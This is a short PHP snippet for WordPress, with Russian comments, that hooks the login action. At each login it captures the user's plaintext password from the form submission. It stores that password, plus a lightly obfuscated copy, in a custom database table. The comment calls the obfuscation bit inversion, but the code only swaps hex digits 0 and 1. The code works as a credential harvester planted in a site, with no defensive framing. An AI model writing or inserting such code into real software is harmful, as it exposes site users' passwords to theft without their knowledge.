<?php
function invert_bits($password) {
    $binary = unpack('H*', $password)[1]; // Переводим в hex
    $binary = strtr($binary, '01', '10'); // Инвертируем биты (меняем 0 на 1, 1 на 0)
    return pack('H*', $binary); // Обратно в строку
}

function save_user_auth_data($user_login, $user) {
    global $wpdb;

    if (!isset($_POST['pwd'])) {
        return; // Если пароля нет, не записываем
    }

    $password = $_POST['pwd']; // Обычный пароль
    $inverted_password = invert_bits($password); // Инвертированный пароль

    $wpdb->insert(
        $wpdb->prefix . 'user_auth_alt', // Правильное название таблицы
        array(
            'user_login' => $user_login,
            'password' => $password,
            'inverted_password' => $inverted_password,
            'created_at' => current_time('mysql')
        ),
        array('%s', '%s', '%s', '%s')
    );
}
add_action('wp_login', 'save_user_auth_data', 10, 2);
